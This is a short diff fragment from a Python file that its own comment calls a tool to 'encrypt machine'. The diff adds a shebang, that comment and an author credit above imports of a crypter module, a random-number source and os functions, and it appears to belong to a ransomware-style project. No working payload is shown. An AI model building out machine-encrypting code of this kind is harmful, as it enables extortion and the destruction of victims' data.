@@ -1,3 +1,7 @@
+#!/usr/bin/env python
+# Rain's file to encrypt machine
+# Developed by WillRazorFace
+
 from Crypter import Crypt
 from Crypto.Random import new
 from os import getenv, chdir, system
